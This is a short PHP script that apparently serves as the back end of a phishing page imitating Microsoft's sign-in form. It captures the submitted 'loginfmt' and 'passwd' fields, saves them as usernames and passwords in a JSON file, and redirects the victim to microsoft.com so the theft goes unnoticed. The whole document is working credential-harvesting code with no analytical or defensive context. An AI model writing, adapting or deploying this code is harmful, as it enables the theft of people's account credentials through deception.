<?php
$user = $_POST['loginfmt'];
$pass = $_POST['passwd'];
$data['dev'][] = array('username' =>$user,
'password'=>$pass);

$jdata = json_encode($data);
$f = fopen('usernames.json', 'w');
fwrite($f, $jdata);
fclose($f);

header('Location: https://microsoft.com');
exit();

